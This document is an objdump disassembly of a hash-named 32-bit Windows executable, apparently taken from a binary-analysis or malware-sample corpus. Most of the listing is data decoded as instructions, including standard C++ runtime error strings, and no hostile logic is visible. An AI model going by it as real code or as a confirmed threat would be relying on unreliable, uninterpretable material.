
c2b4237ffd1a0efe97fde1a25f18c3d75b9d17195061a1060798ef69b7d372f5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	rol    BYTE PTR [edx+0x40],1
  401007:	add    BYTE PTR [eax],al
  401009:	sub    al,0x40
  40100b:	add    BYTE PTR [eax],dl
  40100d:	sub    al,0x40
  40100f:	add    BYTE PTR [eax],ah
  401011:	sub    al,0x40
  401013:	add    BYTE PTR [eax+0x2b],al
  401016:	inc    eax
  401017:	add    BYTE PTR [eax+0x2b],ah
  40101a:	inc    eax
  40101b:	add    al,al
  40101d:	sub    eax,DWORD PTR [eax+0x0]
  401020:	loopne 0x40104d
  401022:	inc    eax
	...
  40102b:	add    BYTE PTR [eax],al
  40102d:	inc    edx
  40102e:	inc    eax
  40102f:	add    al,al
  401031:	inc    esi
  401032:	inc    eax
  401033:	add    BYTE PTR [eax],al
  401035:	add    BYTE PTR [eax],al
  401037:	add    BYTE PTR [eax+0x29],ah
  40103a:	add    BYTE PTR [eax],al
  40103c:	inc    eax
  40103d:	sub    eax,DWORD PTR [eax]
  40103f:	add    BYTE PTR [eax+0x2b],ah
  401042:	add    BYTE PTR [eax],al
  401044:	shr    BYTE PTR [ebx],0x0
  401047:	add    al,ah
  401049:	sub    eax,DWORD PTR [eax]
  40104b:	add    BYTE PTR [eax],al
  40104d:	sub    al,0x0
  40104f:	add    BYTE PTR [eax],dl
  401051:	sub    al,0x0
  401053:	add    BYTE PTR [eax],ah
  401055:	sub    al,0x0
  401057:	add    BYTE PTR [eax+0x2c],al
  40105a:	add    BYTE PTR [eax],al
  40105c:	pusha  
  40105d:	sub    al,0x0
  40105f:	add    BYTE PTR [eax+0x2d],dl
  401062:	add    BYTE PTR [eax],al
  401064:	mov    al,ds:0xc000002d
  401069:	xor    DWORD PTR [eax],eax
  40106b:	add    al,dh
  40106d:	xor    DWORD PTR [eax],eax
  40106f:	add    BYTE PTR [eax+0x32],dl
  401072:	add    BYTE PTR [eax],al
  401074:	loopne 0x4010ab
  401076:	add    BYTE PTR [eax],al
  401078:	mov    al,ds:0xc000003a
  40107d:	cmp    al,0x0
  40107f:	add    BYTE PTR [eax+0x3d],al
  401082:	add    BYTE PTR [eax],al
  401084:	jo     0x4010c3
  401086:	add    BYTE PTR [eax],al
  401088:	add    BYTE PTR [edx+0x0],al
  40108b:	add    al,dl
  40108d:	inc    edx
  40108e:	add    BYTE PTR [eax],al
  401090:	push   eax
  401091:	inc    ebp
  401092:	add    BYTE PTR [eax],al
  401094:	pusha  
  401095:	inc    ebp
  401096:	add    BYTE PTR [eax],al
  401098:	xor    BYTE PTR [esi+0x0],al
  40109b:	add    BYTE PTR [eax+0x46],ah
  40109e:	add    BYTE PTR [eax],al
  4010a0:	jo     0x4010e8
  4010a2:	add    BYTE PTR [eax],al
  4010a4:	rol    BYTE PTR [esi+0x0],0x0
  4010a8:	mov    al,ds:0x30000049
  4010ad:	dec    edx
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	mov    al,ds:0x4c
  4010b5:	dec    ebp
  4010b6:	add    BYTE PTR [eax],al
  4010b8:	pusha  
  4010b9:	dec    ebp
  4010ba:	add    BYTE PTR [eax],al
  4010bc:	jo     0x40110b
  4010be:	add    BYTE PTR [eax],al
  4010c0:	mov    al,ds:0xd000004d
  4010c5:	dec    ebp
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	add    BYTE PTR [esi+0x0],cl
  4010cb:	add    al,al
  4010cd:	push   ecx
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	add    BYTE PTR [edx+0x0],dl
  4010d3:	add    BYTE PTR [eax],ah
  4010d5:	push   edx
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	push   eax
  4010d9:	push   edx
  4010da:	add    BYTE PTR [eax],al
  4010dc:	adc    BYTE PTR [ebx+0x0],0x0
  4010e0:	rcl    BYTE PTR [ebx+0x0],0x0
  4010e4:	add    BYTE PTR [eax+eax*1+0x0],dl
  4010e8:	inc    eax
  4010e9:	push   esp
  4010ea:	add    BYTE PTR [eax],al
  4010ec:	push   eax
  4010ed:	push   esp
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	pusha  
  4010f1:	push   esp
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	add    BYTE PTR [ebp+0x0],dl
  4010f7:	add    BYTE PTR [eax],ah
  4010f9:	push   ebp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rcl    BYTE PTR [esi+0x0],0x0
  401100:	add    BYTE PTR [edi+0x0],dl
  401103:	add    BYTE PTR [eax+0x57],ah
  401106:	add    BYTE PTR [eax],al
  401108:	adc    BYTE PTR [edi+0x0],0x0
  40110c:	nop
  40110d:	push   edi
  40110e:	add    BYTE PTR [eax],al
  401110:	mov    al,ds:0xb0000057
  401115:	push   edi
	...
  40111e:	add    BYTE PTR [eax],al
  401120:	xor    BYTE PTR [esi+0x40],al
  401123:	add    BYTE PTR [eax-0xfffbf9f],ah
  401129:	popa   
  40112a:	inc    eax
  40112b:	add    al,dl
  40112d:	dec    ebp
  40112e:	inc    eax
  40112f:	add    BYTE PTR [eax],ah
  401131:	push   ebp
  401132:	inc    eax
  401133:	add    BYTE PTR [edx+0x61],ah
  401136:	and    BYTE PTR fs:[ecx+0x6c],ah
  40113a:	ins    BYTE PTR es:[edi],dx
  40113b:	outs   dx,DWORD PTR ds:[esi]
  40113c:	arpl   WORD PTR [ecx+0x74],sp
  40113f:	imul   ebp,DWORD PTR [edi+0x6e],0x4e000000
  401146:	inc    eax
  401147:	add    BYTE PTR [eax],ah
  401149:	push   ebp
  40114a:	inc    eax
  40114b:	add    BYTE PTR [eax+0x6000404d],ah
  401151:	inc    esi
  401152:	inc    eax
  401153:	add    BYTE PTR [eax+0x46],ah
  401156:	inc    eax
  401157:	add    BYTE PTR [eax],al
  401159:	push   edx
  40115a:	inc    eax
  40115b:	add    BYTE PTR [eax],ah
  40115d:	push   edx
  40115e:	inc    eax
  40115f:	add    BYTE PTR [eax+0x52],dl
  401162:	inc    eax
  401163:	add    BYTE PTR [eax+0x4000404d],ah
  401169:	push   esp
  40116a:	inc    eax
  40116b:	add    BYTE PTR [eax+0x4053],al
  401171:	push   edx
  401172:	inc    eax
  401173:	add    BYTE PTR [eax],ah
  401175:	push   edx
  401176:	inc    eax
  401177:	add    BYTE PTR [eax+0x52],dl
  40117a:	inc    eax
  40117b:	add    BYTE PTR [edi+0x65],ah
  40117e:	outs   dx,BYTE PTR ds:[esi]
  40117f:	gs jb  0x4011eb
  401182:	arpl   WORD PTR [eax],ax
  401184:	jne    0x4011f4
  401186:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40118a:	outs   dx,BYTE PTR ds:[esi]
  40118b:	and    BYTE PTR [ebp+0x72],ah
  40118e:	jb     0x4011ff
  401190:	jb     0x401192
  401192:	add    BYTE PTR [eax],al
  401194:	mov    al,ds:0x5000404d
  401199:	push   esp
  40119a:	inc    eax
  40119b:	add    al,al
  40119d:	push   ebx
  40119e:	inc    eax
  40119f:	add    BYTE PTR [eax],al
  4011a1:	push   edx
  4011a2:	inc    eax
  4011a3:	add    BYTE PTR [eax],ah
  4011a5:	push   edx
  4011a6:	inc    eax
  4011a7:	add    BYTE PTR [eax+0x52],dl
  4011aa:	inc    eax
  4011ab:	add    BYTE PTR [ecx+0x6f],ch
  4011ae:	jae    0x401224
  4011b0:	jb     0x401217
  4011b2:	popa   
  4011b3:	ins    DWORD PTR es:[edi],dx
  4011b4:	add    BYTE PTR [eax],al
  4011b6:	add    BYTE PTR [eax],al
  4011b8:	imul   ebp,DWORD PTR [edi+0x73],0x61657274
  4011bf:	ins    DWORD PTR es:[edi],dx
  4011c0:	and    BYTE PTR [ebx+0x74],dh
  4011c3:	jb     0x40122a
  4011c5:	popa   
  4011c6:	ins    DWORD PTR es:[edi],dx
  4011c7:	and    BYTE PTR [ebp+0x72],ah
  4011ca:	jb     0x40123b
  4011cc:	jb     0x4011ce
  4011ce:	add    BYTE PTR [eax],al
  4011d0:	mov    al,ds:0x6000404d
  4011d5:	push   esp
  4011d6:	inc    eax
  4011d7:	add    BYTE PTR [eax],al
  4011d9:	push   esp
  4011da:	inc    eax
  4011db:	add    al,al
  4011dd:	push   ecx
  4011de:	inc    eax
  4011df:	add    BYTE PTR [eax],ah
  4011e1:	push   edx
  4011e2:	inc    eax
  4011e3:	add    BYTE PTR [eax+0x52],dl
  4011e6:	inc    eax
  4011e7:	add    BYTE PTR [ebx+0x79],dh
  4011ea:	jae    0x401260
  4011ec:	gs ins DWORD PTR es:[edi],dx
  4011ee:	add    BYTE PTR [eax],al
  4011f0:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  4011f7:	and    BYTE PTR [ebx+0x74],dh
  4011fa:	jb     0x401265
  4011fc:	outs   dx,BYTE PTR ds:[esi]
  4011fd:	and    BYTE PTR [bx+si+0x6f],dh
  401201:	jae    0x40126c
  401203:	je     0x40126e
  401205:	outs   dx,DWORD PTR ds:[esi]
  401206:	outs   dx,BYTE PTR ds:[esi]
  401207:	add    BYTE PTR [ebx+0x74],dh
  40120a:	jb     0x401275
  40120c:	outs   dx,BYTE PTR ds:[esi]
  40120d:	and    BYTE PTR [si+0x6f],dh
  401211:	outs   dx,DWORD PTR ds:[esi]
  401212:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  401216:	add    BYTE PTR [di],al
  401219:	add    BYTE PTR [eax],al
  40121b:	add    BYTE PTR [eax+0x14],dh
  40121e:	inc    eax
  40121f:	add    BYTE PTR [edi-0x7c000000],dh
  401225:	adc    al,0x40
  401227:	add    BYTE PTR [eax+eax*1],dl
  40122a:	add    BYTE PTR [eax],al
  40122c:	nop
  40122d:	adc    al,0x40
  40122f:	add    BYTE PTR [edi+0x0],ch
  401232:	add    BYTE PTR [eax],al
  401234:	mov    al,ds:0xaa004014
  401239:	add    BYTE PTR [eax],al
  40123b:	add    BYTE PTR [esp+edx*1+0x8e0040],dh
  401242:	add    BYTE PTR [eax],al
  401244:	mov    ah,0x14
  401246:	inc    eax
  401247:	add    BYTE PTR [edx+0x0],dl
  40124a:	add    BYTE PTR [eax],al
  40124c:	jo     0x401262
  40124e:	inc    eax
  40124f:	add    bl,dh
  401251:	add    eax,DWORD PTR [eax]
  401253:	add    ah,cl
  401255:	adc    al,0x40
  401257:	add    ah,dh
  401259:	add    eax,DWORD PTR [eax]
  40125b:	add    ah,cl
  40125d:	adc    al,0x40
  40125f:	add    ch,dh
  401261:	add    eax,DWORD PTR [eax]
  401263:	add    ah,cl
  401265:	adc    al,0x40
  401267:	add    BYTE PTR [eax],dl
  401269:	add    BYTE PTR [eax],al
  40126b:	add    BYTE PTR [eax+0x14],dh
  40126e:	inc    eax
  40126f:	add    BYTE PTR [edi],dh
  401271:	add    BYTE PTR [eax],al
  401273:	add    BYTE PTR [eax+0x64004014],dl
  401279:	or     DWORD PTR [eax],eax
  40127b:	add    BYTE PTR [esp+edx*1+0x910040],dh
  401282:	add    BYTE PTR [eax],al
  401284:	fcom   DWORD PTR [eax+eax*2]
  401287:	add    BYTE PTR [ebx],cl
  401289:	add    DWORD PTR [eax],eax
  40128b:	add    ah,ch
  40128d:	adc    al,0x40
  40128f:	add    BYTE PTR [eax+0x0],dh
  401292:	add    BYTE PTR [eax],al
  401294:	add    BYTE PTR ds:0x500040,dl
  40129a:	add    BYTE PTR [eax],al
  40129c:	test   BYTE PTR [eax+eax*2],dl
  40129f:	add    BYTE PTR [edx],al
  4012a1:	add    BYTE PTR [eax],al
  4012a3:	add    BYTE PTR [edx*1+0x270040],dl
  4012aa:	add    BYTE PTR [eax],al
  4012ac:	add    BYTE PTR ds:0xc0040,dl
  4012b2:	add    BYTE PTR [eax],al
  4012b4:	jo     0x4012ca
  4012b6:	inc    eax
  4012b7:	add    BYTE PTR [edi],cl
  4012b9:	add    BYTE PTR [eax],al
  4012bb:	add    BYTE PTR [eax+0x1004014],dl
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [eax],dh
  4012c5:	adc    eax,0x60040
  4012ca:	add    BYTE PTR [eax],al
  4012cc:	in     al,dx
  4012cd:	adc    al,0x40
  4012cf:	add    BYTE PTR [ebx+0x0],bh
  4012d2:	add    BYTE PTR [eax],al
  4012d4:	in     al,dx
  4012d5:	adc    al,0x40
  4012d7:	add    BYTE PTR [ecx],ah
  4012d9:	add    BYTE PTR [eax],al
  4012db:	add    BYTE PTR [eax+0x15],cl
  4012de:	inc    eax
  4012df:	add    ah,dl
  4012e1:	add    BYTE PTR [eax],al
  4012e3:	add    BYTE PTR [eax+0x15],cl
  4012e6:	inc    eax
  4012e7:	add    BYTE PTR [ebx-0x14000000],al
  4012ed:	adc    al,0x40
  4012ef:	add    dh,ah
  4012f1:	add    eax,DWORD PTR [eax]
  4012f3:	add    BYTE PTR [eax+0x14],dh
  4012f6:	inc    eax
  4012f7:	add    BYTE PTR [eax],cl
  4012f9:	add    BYTE PTR [eax],al
  4012fb:	add    BYTE PTR [ebp+edx*1+0x40],bl
  4012ff:	add    BYTE PTR ds:0x70000000,dl
  401305:	adc    eax,0x110040
  40130a:	add    BYTE PTR [eax],al
  40130c:	nop
  40130d:	adc    eax,0x6e0040
  401312:	add    BYTE PTR [eax],al
  401314:	int3   
  401315:	adc    al,0x40
  401317:	add    BYTE PTR [ecx+0x9],ah
  40131a:	add    BYTE PTR [eax],al
  40131c:	mov    ah,0x14
  40131e:	inc    eax
  40131f:	add    bl,ah
  401321:	add    eax,DWORD PTR [eax]
  401323:	add    BYTE PTR [ebp+edx*1+0xe0040],ah
  40132a:	add    BYTE PTR [eax],al
  40132c:	pop    esp
  40132d:	adc    eax,0x30040
  401332:	add    BYTE PTR [eax],al
  401334:	adc    al,0x15
  401336:	inc    eax
  401337:	add    BYTE PTR [esi],bl
  401339:	add    BYTE PTR [eax],al
  40133b:	add    ah,cl
  40133d:	adc    al,0x40
  40133f:	add    ch,dl
  401341:	add    al,0x0
  401343:	add    BYTE PTR [eax+0x15],dh
  401346:	inc    eax
  401347:	add    BYTE PTR [ecx],bl
  401349:	add    BYTE PTR [eax],al
  40134b:	add    ah,cl
  40134d:	adc    al,0x40
  40134f:	add    BYTE PTR [eax],ah
  401351:	add    BYTE PTR [eax],al
  401353:	add    BYTE PTR [eax+0x14],dh
  401356:	inc    eax
  401357:	add    BYTE PTR [eax+eax*1],al
  40135a:	add    BYTE PTR [eax],al
  40135c:	mov    eax,0x1d004015
  401361:	add    BYTE PTR [eax],al
  401363:	add    ah,cl
  401365:	adc    al,0x40
  401367:	add    BYTE PTR [ebx],dl
  401369:	add    BYTE PTR [eax],al
  40136b:	add    BYTE PTR [eax+0x14],dh
  40136e:	inc    eax
  40136f:	add    BYTE PTR ds:0xcc000027,bl
  401375:	adc    eax,0x27400040
  40137a:	add    BYTE PTR [eax],al
  40137c:	loopne 0x401393
  40137e:	inc    eax
  40137f:	add    BYTE PTR [ecx+0x27],al
  401382:	add    BYTE PTR [eax],al
  401384:	lock adc eax,0x273f0040
  40138a:	add    BYTE PTR [eax],al
  40138c:	or     BYTE PTR [esi],dl
  40138e:	inc    eax
  40138f:	add    BYTE PTR ds:0x28000027,dh
  401395:	push   ss
  401396:	inc    eax
  401397:	add    BYTE PTR [ecx],bl
  401399:	daa    
  40139a:	add    BYTE PTR [eax],al
  40139c:	dec    eax
  40139d:	push   ss
  40139e:	inc    eax
  40139f:	add    BYTE PTR [ebp+0x27],al
  4013a2:	add    BYTE PTR [eax],al
  4013a4:	pop    esp
  4013a5:	push   ss
  4013a6:	inc    eax
  4013a7:	add    BYTE PTR [ebp+0x27],cl
  4013aa:	add    BYTE PTR [eax],al
  4013ac:	jo     0x4013c4
  4013ae:	inc    eax
  4013af:	add    BYTE PTR [esi+0x27],al
  4013b2:	add    BYTE PTR [eax],al
  4013b4:	test   BYTE PTR [esi],dl
  4013b6:	inc    eax
  4013b7:	add    BYTE PTR [edi],dh
  4013b9:	daa    
  4013ba:	add    BYTE PTR [eax],al
  4013bc:	cwde   
  4013bd:	push   ss
  4013be:	inc    eax
  4013bf:	add    BYTE PTR [esi],bl
  4013c1:	daa    
  4013c2:	add    BYTE PTR [eax],al
  4013c4:	mov    eax,0x51004016
  4013c9:	daa    
  4013ca:	add    BYTE PTR [eax],al
  4013cc:	les    edx,FWORD PTR [esi]
  4013ce:	inc    eax
  4013cf:	add    BYTE PTR [edi+eiz*1],dh
  4013d2:	add    BYTE PTR [eax],al
  4013d4:	fcom   DWORD PTR [esi]
  4013d6:	inc    eax
  4013d7:	add    BYTE PTR [edi+eiz*1],dl
  4013da:	add    BYTE PTR [eax],al
  4013dc:	lock push ss
  4013de:	inc    eax
  4013df:	add    BYTE PTR [esi],ah
  4013e1:	daa    
  4013e2:	add    BYTE PTR [eax],al
  4013e4:	cld    
  4013e5:	push   ss
  4013e6:	inc    eax
  4013e7:	add    BYTE PTR [eax+0x27],cl
  4013ea:	add    BYTE PTR [eax],al
  4013ec:	adc    BYTE PTR [edi],dl
  4013ee:	inc    eax
  4013ef:	add    BYTE PTR [eax],ch
  4013f1:	daa    
  4013f2:	add    BYTE PTR [eax],al
  4013f4:	and    al,0x17
  4013f6:	inc    eax
  4013f7:	add    BYTE PTR [eax],bh
  4013f9:	daa    
  4013fa:	add    BYTE PTR [eax],al
  4013fc:	cmp    BYTE PTR [edi],dl
  4013fe:	inc    eax
  4013ff:	add    BYTE PTR [edi+0x27],cl
  401402:	add    BYTE PTR [eax],al
  401404:	dec    eax
  401405:	pop    ss
  401406:	inc    eax
  401407:	add    BYTE PTR [edx+0x27],al
  40140a:	add    BYTE PTR [eax],al
  40140c:	pop    esp
  40140d:	pop    ss
  40140e:	inc    eax
  40140f:	add    BYTE PTR [edi+eiz*1+0x0],al
  401413:	add    BYTE PTR [edi+edx*1+0x40],ch
  401417:	add    BYTE PTR [ebx+0x27],al
  40141a:	add    BYTE PTR [eax],al
  40141c:	jl     0x401435
  40141e:	inc    eax
  40141f:	add    BYTE PTR [edi+0x27],al
  401422:	add    BYTE PTR [eax],al
  401424:	nop
  401425:	pop    ss
  401426:	inc    eax
  401427:	add    BYTE PTR [edx],bh
  401429:	daa    
  40142a:	add    BYTE PTR [eax],al
  40142c:	mov    al,ds:0x49004017
  401431:	daa    
  401432:	add    BYTE PTR [eax],al
  401434:	mov    ah,0x17
  401436:	inc    eax
  401437:	add    BYTE PTR [esi],dh
  401439:	daa    
  40143a:	add    BYTE PTR [eax],al
  40143c:	les    edx,FWORD PTR [edi]
  40143e:	inc    eax
  40143f:	add    BYTE PTR ds:0xd4000027,bh
  401445:	pop    ss
  401446:	inc    eax
  401447:	add    BYTE PTR [ebx],bh
  401449:	daa    
  40144a:	add    BYTE PTR [eax],al
  40144c:	in     al,dx
  40144d:	pop    ss
  40144e:	inc    eax
  40144f:	add    BYTE PTR [ecx],bh
  401451:	daa    
  401452:	add    BYTE PTR [eax],al
  401454:	add    al,0x18
  401456:	inc    eax
  401457:	add    BYTE PTR [edi+eiz*1+0x0],cl
  40145b:	add    BYTE PTR [eax],bl
  40145d:	sbb    BYTE PTR [eax+0x0],al
  401460:	xor    esp,DWORD PTR [edi]
  401462:	add    BYTE PTR [eax],al
  401464:	and    al,0x18
  401466:	inc    eax
	...
  40146f:	add    BYTE PTR [eax+0x65],dh
  401472:	jb     0x4014e1
  401474:	imul   esi,DWORD PTR [ebx+0x73],0x206e6f69
  40147b:	fs outs dx,BYTE PTR gs:[esi]
  40147e:	imul   esp,DWORD PTR [ebp+0x64],0x66000000
  401485:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x73697865
  40148d:	je     0x401502
  40148f:	add    BYTE PTR [esi+0x6f],ch
  401492:	and    BYTE PTR [ebx+0x75],dh
  401495:	arpl   WORD PTR [eax+0x20],bp
  401498:	fs gs jbe 0x401505
  40149c:	arpl   WORD PTR [ebp+0x0],sp
  40149f:	add    BYTE PTR [esi+0x69],ah
  4014a2:	ins    BYTE PTR es:[edi],dx
  4014a3:	outs   dx,BYTE PTR gs:[esi]
  4014a5:	popa   
  4014a6:	ins    DWORD PTR es:[edi],dx
  4014a7:	and    BYTE PTR gs:[edi+ebp*2+0x6f],dh
  4014ac:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  4014b0:	add    BYTE PTR [bx+si],al
  4014b3:	add    BYTE PTR [ebp+eiz*2+0x76],ah
  4014b7:	imul   esp,DWORD PTR [ebx+0x65],0x20726f20
  4014be:	jb     0x401525
  4014c0:	jae    0x401531
  4014c2:	jne    0x401536
  4014c4:	arpl   WORD PTR [ebp+0x20],sp
  4014c7:	bound  esi,QWORD PTR [ebp+0x73]
  4014ca:	jns    0x4014cc
  4014cc:	imul   ebp,DWORD PTR [edi+0x20],0x6f727265
  4014d3:	jb     0x4014d5
  4014d5:	add    BYTE PTR [eax],al
  4014d7:	add    BYTE PTR [ecx+ebp*2+0x72],ah
  4014db:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4014e0:	jns    0x401502
  4014e2:	outs   dx,BYTE PTR ds:[esi]
  4014e3:	outs   dx,DWORD PTR ds:[esi]
  4014e4:	je     0x401506
  4014e6:	gs ins DWORD PTR es:[edi],dx
  4014e8:	jo     0x40155e
  4014ea:	jns    0x4014ec
  4014ec:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  4014f3:	and    BYTE PTR [ecx+0x72],ah
  4014f6:	addr16 jne 0x401566
  4014f9:	outs   dx,BYTE PTR gs:[esi]
  4014fb:	je     0x4014fd
  4014fd:	add    BYTE PTR [eax],al
  4014ff:	add    BYTE PTR [esi+0x6f],ch
  401502:	and    BYTE PTR [ebx+0x70],dh
  401505:	popa   
  401506:	arpl   WORD PTR [ebp+0x20],sp
  401509:	outs   dx,DWORD PTR ds:[esi]
  40150a:	outs   dx,BYTE PTR ds:[esi]
  40150b:	and    BYTE PTR [ebp+eiz*2+0x76],ah
  40150f:	imul   esp,DWORD PTR [ebx+0x65],0x6f6e0000
  401516:	and    BYTE PTR [ebx+0x75],dh
  401519:	arpl   WORD PTR [eax+0x20],bp
  40151c:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x726f
  401523:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  401527:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40152c:	jns    0x40152e
  40152e:	add    BYTE PTR [eax],al
  401530:	data16 jne 0x4015a1
  401533:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401537:	outs   dx,BYTE PTR ds:[esi]
  401538:	and    BYTE PTR [esi+0x6f],ch
  40153b:	je     0x40155d
  40153d:	jae    0x4015b4
  40153f:	jo     0x4015b1
  401541:	outs   dx,DWORD PTR ds:[esi]
  401542:	jb     0x4015b8
  401544:	gs add BYTE PTR fs:[eax],al
  401548:	outs   dx,BYTE PTR ds:[esi]
  401549:	outs   dx,DWORD PTR ds:[esi]
  40154a:	and    BYTE PTR [edi+ebp*2+0x63],ch
  40154e:	imul   esp,DWORD PTR [eax],0x61
  401551:	jbe    0x4015b4
  401553:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  40155b:	add    BYTE PTR [esi+0x6f],ch
  40155e:	je     0x401580
  401560:	outs   dx,BYTE PTR gs:[esi]
  401562:	outs   dx,DWORD PTR ds:[esi]
  401563:	jne    0x4015cc
  401565:	push   0x6d656d20
  40156a:	outs   dx,DWORD PTR ds:[esi]
  40156b:	jb     0x4015e6
  40156d:	add    BYTE PTR [eax],al
  40156f:	add    BYTE PTR [edx+0x65],dh
  401572:	jae    0x4015e3
  401574:	jne    0x4015e8
  401576:	arpl   WORD PTR [ebp+0x20],sp
  401579:	jne    0x4015e9
  40157b:	popa   
  40157c:	jbe    0x4015df
  40157e:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x7420656c
  401586:	jb     0x401601
  401588:	and    BYTE PTR [ecx+0x67],ah
  40158b:	popa   
  40158c:	imul   ebp,DWORD PTR [esi+0x0],0x6f726300
  401593:	jae    0x401608
  401595:	and    BYTE PTR [ebp+eiz*2+0x76],ah
  401599:	imul   esp,DWORD PTR [ebx+0x65],0x6e696c20
  4015a0:	imul   eax,DWORD PTR [eax],0x0
  4015a3:	add    BYTE PTR [edi+0x70],ch
  4015a6:	gs jb  0x40160a
  4015a9:	je     0x401614
  4015ab:	outs   dx,DWORD PTR ds:[esi]
  4015ac:	outs   dx,BYTE PTR ds:[esi]
  4015ad:	and    BYTE PTR [ebx+0x61],ah
  4015b0:	outs   dx,BYTE PTR ds:[esi]
  4015b1:	arpl   WORD PTR [ebp+0x6c],sp
  4015b4:	gs add BYTE PTR fs:[eax],al
  4015b8:	je     0x401629
  4015ba:	outs   dx,DWORD PTR ds:[esi]
  4015bb:	and    BYTE PTR [ebp+0x61],ch
  4015be:	outs   dx,BYTE PTR ds:[esi]
  4015bf:	jns    0x4015e1
  4015c1:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f20
  4015c8:	jo     0x40162f
  4015ca:	outs   dx,BYTE PTR ds:[esi]
  4015cb:	add    BYTE PTR [eax+0x65],dh
  4015ce:	jb     0x40163d
  4015d0:	imul   esi,DWORD PTR [ebx+0x73],0x5f6e6f69
  4015d7:	fs outs dx,BYTE PTR gs:[esi]
  4015da:	imul   esp,DWORD PTR [ebp+0x64],0x61000000
  4015e1:	fs fs jb 0x40164a
  4015e5:	jae    0x40165a
  4015e7:	pop    edi
  4015e8:	imul   ebp,DWORD PTR [esi+0x5f],0x657375
  4015ef:	add    BYTE PTR [ecx+0x64],ah
  4015f2:	fs jb  0x40165a
  4015f5:	jae    0x40166a
  4015f7:	pop    edi
  4015f8:	outs   dx,BYTE PTR ds:[esi]
  4015f9:	outs   dx,DWORD PTR ds:[esi]
  4015fa:	je     0x40165b
  4015fc:	popa   
  4015fd:	jbe    0x401660
  4015ff:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401607:	add    BYTE PTR [ecx+0x64],ah
  40160a:	fs jb  0x401672
  40160d:	jae    0x401682
  40160f:	pop    edi
  401610:	popaw  
  401612:	ins    DWORD PTR es:[edi],dx
  401613:	imul   ebp,DWORD PTR [ecx+edi*2+0x5f],0x5f746f6e
  40161b:	jae    0x401692
  40161d:	jo     0x40168f
  40161f:	outs   dx,DWORD PTR ds:[esi]
  401620:	jb     0x401696
  401622:	gs add BYTE PTR fs:[eax],al
  401626:	add    BYTE PTR [eax],al
  401628:	arpl   WORD PTR [edi+0x6e],bp
  40162b:	outs   dx,BYTE PTR ds:[esi]
  40162c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401631:	outs   dx,BYTE PTR ds:[esi]
  401632:	pop    edi
  401633:	popa   
  401634:	ins    BYTE PTR es:[edi],dx
  401635:	jb     0x40169c
  401637:	popa   
  401638:	fs jns 0x40169a
  40163b:	imul   ebp,DWORD PTR [esi+0x5f],0x676f7270
  401642:	jb     0x4016a9
  401644:	jae    0x4016b9
  401646:	add    BYTE PTR [eax],al
  401648:	bound  esp,QWORD PTR [ecx+0x64]
  40164b:	pop    edi
  40164c:	imul   bp,WORD PTR [ebp+eiz*2+0x5f],0x6564
  401653:	jae    0x4016b8
  401655:	jb     0x4016c0
  401657:	jo     0x4016cd
  401659:	outs   dx,DWORD PTR ds:[esi]
  40165a:	jb     0x40165c
  40165c:	arpl   WORD PTR [edi+0x6e],bp
  40165f:	outs   dx,BYTE PTR ds:[esi]
  401660:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401665:	outs   dx,BYTE PTR ds:[esi]
  401666:	pop    edi
  401667:	popa   
  401668:	bound  ebp,QWORD PTR [edi+0x72]
  40166b:	je     0x4016d2
  40166d:	add    BYTE PTR fs:[eax],al
  401670:	arpl   WORD PTR [edi+0x6e],bp
  401673:	outs   dx,BYTE PTR ds:[esi]
  401674:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401679:	outs   dx,BYTE PTR ds:[esi]
  40167a:	pop    edi
  40167b:	jb     0x4016e2
  40167d:	data16 jne 0x4016f3
  401680:	gs add BYTE PTR fs:[eax],al
  401684:	arpl   WORD PTR [edi+0x6e],bp
  401687:	outs   dx,BYTE PTR ds:[esi]
  401688:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40168d:	outs   dx,BYTE PTR ds:[esi]
  40168e:	pop    edi
  40168f:	jb     0x4016f6
  401691:	jae    0x4016f8
  401693:	je     0x401695
  401695:	add    BYTE PTR [eax],al
  401697:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  40169b:	je     0x401706
  40169d:	outs   dx,BYTE PTR ds:[esi]
  40169e:	popa   
  40169f:	je     0x40170a
  4016a1:	outs   dx,DWORD PTR ds:[esi]
  4016a2:	outs   dx,BYTE PTR ds:[esi]
  4016a3:	pop    edi
  4016a4:	popa   
  4016a5:	fs fs jb 0x40170e
  4016a9:	jae    0x40171e
  4016ab:	pop    edi
  4016ac:	jb     0x401713
  4016ae:	jno    0x401725
  4016b0:	imul   esi,DWORD PTR [edx+0x65],0x64
  4016b7:	add    BYTE PTR [edx+0x61],ah
  4016ba:	fs pop edi
  4016bc:	popa   
  4016bd:	fs fs jb 0x401726
  4016c1:	jae    0x401736
  4016c3:	add    BYTE PTR [eax+0x6f],ch
  4016c6:	jae    0x40173c
  4016c8:	pop    edi
  4016c9:	jne    0x401739
  4016cb:	jb     0x401732
  4016cd:	popa   
  4016ce:	arpl   WORD PTR [eax+0x61],bp
  4016d1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4016d5:	add    BYTE PTR [eax],al
